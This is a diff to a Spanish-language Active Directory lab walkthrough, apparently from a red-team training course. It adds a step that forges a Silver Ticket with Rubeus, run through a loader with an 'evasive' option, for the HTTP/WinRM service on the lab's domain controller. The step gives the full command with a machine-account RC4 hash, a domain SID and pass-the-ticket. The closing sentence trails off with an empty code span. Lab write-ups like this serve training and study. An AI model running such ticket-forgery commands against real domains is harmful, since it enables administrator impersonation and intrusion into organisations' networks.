@@ -835,3 +835,9 @@ winrs -r:dcorp-dc cmd
 A partir de la información recopilada en los pasos anteriores obtuvimos el hash para la cuenta de la maquina de *Domain Controller*.
 Podemos crear un *Silver Ticket* que nos proporcionará acceso al servicio de HTTP (WinRM) en el *Domain Controller*
 
+Crearemos el *Silver Ticket* con *Rubeus*
+```shell
+[student97]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:4e9815869d2090ccfca61c1fe0d23986 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+```
+El hash rc4 ha sido obtenido de la ejecucion del anterior comando ``
